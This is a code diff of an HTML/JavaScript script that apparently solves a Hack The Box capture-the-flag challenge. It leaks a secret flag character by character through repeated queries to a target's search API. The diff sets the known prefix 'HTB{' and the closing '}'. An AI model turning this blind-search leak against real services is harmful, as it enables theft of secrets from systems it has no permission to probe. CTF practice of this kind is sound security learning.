@@ -5,7 +5,7 @@
 <html>
 <script>
 var ip = '46.101.14.124:31467';
-var flag = 'Ba'; // init search word
+var flag = 'HTB{'; // init search word
 var letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
 var url = `http://${ip}/api/entries/search?q=`;
 async function getLetter(ch){
@@ -20,7 +20,7 @@ async function getLetter(ch){
 async function getFullWord(letters) {
   var b = false; var ch;
   for(var i=0; i < letters.length; i++){
-    await getLetter(letters[i]).then((res) => {flag=flag.concat(res); b = res==='x' ? true:false; i=0} , (res)=> { } );
+    await getLetter(letters[i]).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
     if(b) break;
   }
 };
